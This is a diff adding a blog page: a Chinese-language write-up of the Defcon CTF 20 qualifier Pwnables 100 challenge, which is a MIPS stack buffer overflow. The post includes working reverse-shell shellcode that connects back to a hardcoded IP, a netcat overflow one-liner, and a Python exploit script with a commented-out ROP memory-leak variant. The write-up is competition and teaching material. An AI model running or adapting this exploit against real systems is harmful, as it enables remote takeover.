@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+    
+      <meta name="description" content="DEBUG 又到了一年一度的駭客界盛事 Defcon ctf qual 的……. 半個月後了，期末考終於有時間來寫個 write up 了XD 由於沒有在時間內解完，所以這篇算是事後腦補文！ 沒在時間內解出卡住的點是，沒有看出有 setrlimit 的限制以及，腦袋轉的不夠快沒有想到利用 ROP 去 leak memory address Pwnables 100題目描述  Pwn it! Run">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Defcon ctf 20 qual pp100 Writeup">
+<meta property="og:url" content="https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="DEBUG 又到了一年一度的駭客界盛事 Defcon ctf qual 的……. 半個月後了，期末考終於有時間來寫個 write up 了XD 由於沒有在時間內解完，所以這篇算是事後腦補文！ 沒在時間內解出卡住的點是，沒有看出有 setrlimit 的限制以及，腦袋轉的不夠快沒有想到利用 ROP 去 leak memory address Pwnables 100題目描述  Pwn it! Run">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/1cad112c084e9f9a-01.jpg">
+<meta property="og:image" content="https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/70b760f0262a55d5-02.jpg">
+<meta property="og:image" content="https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/5466a31e3ffd6f8c-03.jpg">
+<meta property="og:image" content="https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/857792e151f46a91-04.jpg">
+<meta property="article:published_time" content="2012-06-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-03T06:29:16.634Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/1cad112c084e9f9a-01.jpg">
+    
+
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Defcon ctf 20 qual pp100 Writeup | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <a class="u-url u-uid" href="/"> <h1 class="p-name">Orange Tsai</h1> </a>
+    </div>
+  
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Defcon ctf 20 qual pp100 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2012-06-18T16:00:00.000Z" class="dt-published" itemprop="datePublished">2012-06-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><a href="https://blog.orange.tw//2012/06/defcon-ctf-20-qual-pp100-writeup.html">DEBUG</a></p>
+<p>又到了一年一度的駭客界盛事 Defcon ctf qual 的……. 半個月後了，期末考終於有時間來寫個 write up 了XD 由於沒有在時間內解完，所以這篇算是事後腦補文！</p>
+<p>沒在時間內解出卡住的點是，沒有看出有 setrlimit 的限制以及，腦袋轉的不夠快沒有想到利用 ROP 去 leak memory address</p>
+<h1 id="Pwnables-100"><a href="#Pwnables-100" class="headerlink" title="Pwnables 100"></a>Pwnables 100</h1><p>題目描述</p>
+<blockquote>
+<p>Pwn it! Running on 140.197.217.85:1994 Download the binary</p>
+</blockquote>
+<p>檔案可以在這下載</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://rdlabs.org/dc20qual/pwn100-mv6bd73ca07e54cbb28a3568723bdc6c9a">http://rdlabs.org/dc20qual/pwn100-mv6bd73ca07e54cbb28a3568723bdc6c9a</a></p>
+</blockquote>
+<p>連進去長得像這樣</p>
+<p><img src="/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/1cad112c084e9f9a-01.jpg"></p>
+<p>可以用 binutils 的 file 觀察發現是 MIPS 架構的 ELF binary</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">orange@z:~/ctf$ file pp100</span><br><span class="line">pp100: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.4.18, stripped</span><br></pre></td></tr></table></figure>
+
+
+
+<p>環境可以利用 QEMU 架起來，可參考 <a target="_blank" rel="noopener" href="http://weng32002.blogspot.tw/2011/03/qemu.html">這篇</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mipsel.exe \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>想要網路的話加上參數 <code>-net user</code> &amp; <code>-net nic</code>，想到 forward port 的話加上參數 <code>-redir tcp:22::22</code> (Host OS 22 port to Guest OS 22 port)，QEMU 長得像這樣</p>
+<p><img src="/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/70b760f0262a55d5-02.jpg"></p>
+<p>接著開始進行分析，配合 IDA pro 觀察，在 gdb 中會發現在 <code>png2ascii</code> 指令內超過一定長度會產生 Segmentation fault. 慢慢減少字串長度發現在 260 bytes 後的字元可以覆蓋到 PC</p>
+<blockquote>
+<p>python -c “print ‘png2ascii\n’ + “0”*260 +’A’*4” | nc 0 1994</p>
+</blockquote>
+<p><img src="/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/5466a31e3ffd6f8c-03.jpg"></p>
+<p>很簡單的 Buffer overflow 不過是 MIPS ~“~</p>
+<p>可以很快地寫出 Exploit 但是 shellcode 有大小限制 ，網路上的皆無法使用所以只好自己寫 &#x3D; &#x3D;||| (網路上的 shellcode 是考慮到 null byte，所以利用變形的方式繞過所以寫得又臭又長，而且還有寫錯的<del>“</del>)</p>
+<p>要注意的點</p>
+<ol>
+<li>MIPS 有分 Big endian 以及 Little endian，可以從 “\xc0\x01\x01\x01” or “\x01\x01\x01\xc0” 看出</li>
+<li>syscall 值 可以參考 &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h</li>
+<li>MIPS 參數傳遞由 a0,a1,a2,a3 下去</li>
+<li>MIPS 回傳值位於 ra</li>
+<li>字串放進 stack 內位置要對齊，不然會寫得很幹！</li>
+</ol>
+<p>透過 gdb, gcc, objdump, strace 可以寫出 shellcode，大致如</p>
+<blockquote>
+<p>setrlimit -&gt; socket -&gt; connect -&gt; dup2(將 stdout, stdin, stderr 轉至 fd) -&gt; execv</p>
+</blockquote>
+<p>Reference 中另外一隊的寫法是直接將當前連線當成資料交換的地方，直接 dup2，更厲害讓 shellcode 更短</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// setrlimit</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $v0,4075&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a0,5&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;addiu $a1,$sp,-64&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $t7,100&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $t7,-64($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $t7,-60($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall 0x40404&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a0,2&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a1,2&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a2,6&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $v0,4183&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall 0x40404&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// connect</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $v0,-1($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;lw $a0,-1($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;lui $t7,0x5555&quot;</span>);      <span class="comment">// port</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;ori $t7, $t7,2&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $t7,-32($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;lui $t5,0xc893&quot;</span>);      <span class="comment">// IP</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;ori $t5,$t5,0xe6ad&quot;</span>);  <span class="comment">// IP</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $t5,-28($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;addi $a1,$sp,-32&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a2,16&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $v0,4170&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall 0x40404&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//dup2</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a1,2&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;lw $a0,-1($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;out:&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $v0,4063&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall 0x40404&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;addi $a1,$a1,-1&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $t3,-1&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;bne $a1,$t3,out&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execv</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;lui $t7,0x6e69&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;ori $t7,$t7,0x622f&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $t7,-12($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;lui $t6,0x68&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;ori $t6,$t6,0x732f&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $t6,-8($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;sw $zero,-4($sp)&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;addiu $a0,$sp,-12&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a1,0&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $a2,0&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;li $v0,4011&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall 0x40404&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>總共長度為 176 bytes，接下來的問題就是如何找到 shellcode 在 stack 的位置</p>
+<p><img src="/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/857792e151f46a91-04.jpg"></p>
+<p>利用 Return Oriented Programming (ROP) 可以跳至 syscall <code>__NR_send</code> 的位置，並且參數可以自己控制最終將 Remote 的記憶體資料讀回來找出 shellcode 位置，最終的 Exploit python code</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;140.197.217.85&quot;</span></span><br><span class="line"><span class="comment">#HOST = &quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="number">1994</span></span><br><span class="line"></span><br><span class="line">sc = (  <span class="string">&quot;\xEB\x0F\x02\x24\x05\x00\x04\x24\xC0\xFF\xA5\x27\x64\x00\x0F\x24&quot;</span></span><br><span class="line">        <span class="string">&quot;\xC0\xFF\xAF\xAF\xC4\xFF\xAF\xAF\x0C\x01\x01\x01\x02\x00\x04\x24&quot;</span></span><br><span class="line">        <span class="string">&quot;\x02\x00\x05\x24\x06\x00\x06\x24\x57\x10\x02\x24\x0C\x01\x01\x01&quot;</span></span><br><span class="line">        <span class="string">&quot;\xFF\xFF\xA2\xAF\xFF\xFF\xA4\x8F\x55\x55\x0F\x3C\x02\x00\xEF\x35&quot;</span></span><br><span class="line">        <span class="string">&quot;\xE0\xFF\xAF\xAF\x93\xC8\x0D\x3C\xAD\xE6\xAD\x35\xE4\xFF\xAD\xAF&quot;</span></span><br><span class="line">        <span class="string">&quot;\xE0\xFF\xA5\x23\x10\x00\x06\x24\x4A\x10\x02\x24\x0C\x01\x01\x01&quot;</span></span><br><span class="line">        <span class="string">&quot;\x02\x00\x05\x24\xFF\xFF\xA4\x8F\xDF\x0F\x02\x24\x0C\x01\x01\x01&quot;</span></span><br><span class="line">        <span class="string">&quot;\xFF\xFF\xA5\x20\xFF\xFF\x0B\x24\xFB\xFF\xAB\x14\x25\x08\x20\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x69\x6E\x0F\x3C\x2F\x62\xEF\x35\xF4\xFF\xAF\xAF\x68\x00\x0E\x3C&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2F\x73\xCE\x35\xF8\xFF\xAE\xAF\xFC\xFF\xA0\xAF\xF4\xFF\xA4\x27&quot;</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\x05\x24\x00\x00\x06\x24\xAB\x0F\x02\x24\x0C\x01\x01\x01&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">nop = <span class="string">&quot;A&quot;</span>*(<span class="number">260</span>-<span class="built_in">len</span>(sc))</span><br><span class="line">retAddr = <span class="number">0x7f7fbc6a</span>    <span class="comment"># shellcode address</span></span><br><span class="line"><span class="comment">#retAddr = 0x00411498    # ROP to leak stack address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;png2ascii\n&#x27;</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get stack memoery</span></span><br><span class="line">    <span class="comment"># s.send(nop + \</span></span><br><span class="line">    <span class="comment">#        sc + \</span></span><br><span class="line">    <span class="comment">#        pack(&quot;I&quot;, retAddr) + \</span></span><br><span class="line">    <span class="comment">#        pack(&quot;I&quot;, 4) + \</span></span><br><span class="line">    <span class="comment">#        pack(&quot;I&quot;, 0x4bd740 ) + \</span></span><br><span class="line">    <span class="comment">#        pack(&quot;I&quot;, 0xffff) + \</span></span><br><span class="line">    <span class="comment">#        pack(&quot;I&quot;, 0) + &quot;\n&quot;</span></span><br><span class="line">    <span class="comment">#      )</span></span><br><span class="line">    <span class="comment"># tmp = []</span></span><br><span class="line">    <span class="comment"># for i in range(0, 0xffff, 1024):</span></span><br><span class="line">    <span class="comment">#    buf = s.recv(1024)</span></span><br><span class="line">    <span class="comment">#    tmp.append( buf )</span></span><br><span class="line">    <span class="comment"># with open(&quot;temp.txt&quot;, &quot;w+&quot;) as fp:</span></span><br><span class="line">    <span class="comment">#    fp.write( &quot;&quot;.join(tmp) )</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># jump to shellcode</span></span><br><span class="line">    s.send(nop + sc + pack(<span class="string">&quot;I&quot;</span>, retAddr) + <span class="string">&quot;1234&quot;</span>)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+
+
+<p>Reference:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://blog.lse.epita.fr/articles/17-defcon2k12-prequals-pwn100-writeup.html">http://blog.lse.epita.fr/articles/17-defcon2k12-prequals-pwn100-writeup.html</a><br><a target="_blank" rel="noopener" href="http://www.exploit-db.com/exploits/18226/">http://www.exploit-db.com/exploits/18226/</a><br><a target="_blank" rel="noopener" href="http://www.thc.org/root/docs/exploit_writing/mipsshellcode.pdf">http://www.thc.org/root/docs/exploit_writing/mipsshellcode.pdf</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2025
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
